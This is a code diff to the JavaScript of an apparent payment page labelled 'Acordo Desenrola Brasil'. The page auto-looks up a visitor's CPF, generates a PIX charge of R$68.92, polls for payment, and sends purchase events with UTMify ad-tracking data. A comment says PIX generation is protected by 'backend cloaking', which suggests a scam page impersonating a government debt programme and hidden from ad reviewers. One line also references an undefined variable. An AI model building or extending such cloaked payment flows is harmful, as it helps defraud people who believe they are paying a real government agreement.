@@ -73,18 +73,29 @@ if (!dadosConsulta.nome && rawCpf) {
     .catch(err => console.log('Consulta automática:', err));
 }
 
-// Requisição de geração de PIX protegida no servidor (backend cloaking)
+let _currentTransactionId = null;
+let _currentOrderId = null;
+
+// Requisição de geração de PIX protegida no servidor (backend cloaking) com atribuição UTMify
 async function requestGerarPix() {
   const rawCpf = (dadosConsulta.cpf || '').replace(/\D/g, '');
   const nome = dadosConsulta.nome || '';
+  const tracking = (window.UTMifyTracker && typeof window.UTMifyTracker.getTrackingParams === 'function')
+    ? window.UTMifyTracker.getTrackingParams()
+    : {};
+  const orderId = 'order_desenrola_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7);
+  _currentOrderId = orderId;
 
   try {
     const res = await fetch('/api/gerar-pix', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cpf: rawCpf, nome: nome })
+      body: JSON.stringify({ cpf: rawCpf, nome: nome, tracking: tracking, orderId: orderId })
     });
     const data = await res.json();
+    if (data && (data.transaction_id || data.id)) {
+      _currentTransactionId = data.transaction_id || data.id;
+    }
     return data;
   } catch (err) {
     console.error('Erro na requisição /api/gerar-pix:', err);
@@ -1114,7 +1125,7 @@ function startMonitoringPix(transactionId) {
       const statusData = await res.json();
       if (statusData && (statusData.paid || statusData.status === 'approved' || statusData.status === 'paid')) {
         clearInterval(_monitorPixInterval);
-        mostrarSucessoPagamento();
+        mostrarSucessoPagamento(statusData.order_id || _currentOrderId, transactionId);
       }
     } catch (e) {
       // Ignora oscilações na rede durante o polling
@@ -1122,12 +1133,17 @@ function startMonitoringPix(transactionId) {
   }, 3500);
 }
 
-function mostrarSucessoPagamento() {
+function mostrarSucessoPagamento(verifiedOrderId, verifiedTxId) {
+  const finalOrderId = verifiedOrderId || _currentOrderId || ('order_' + Date.now().toString(36));
+  const finalTxId = verifiedTxId || _currentTransactionId || transactionId;
+
   if (typeof trackPixelEvent === 'function') {
     trackPixelEvent('Purchase', {
       value: 68.92,
       currency: 'BRL',
-      content_name: 'Acordo Desenrola Brasil'
+      content_name: 'Acordo Desenrola Brasil',
+      orderId: finalOrderId,
+      transactionId: finalTxId
     });
   }
   const pixCard = document.querySelector('.pix-card');
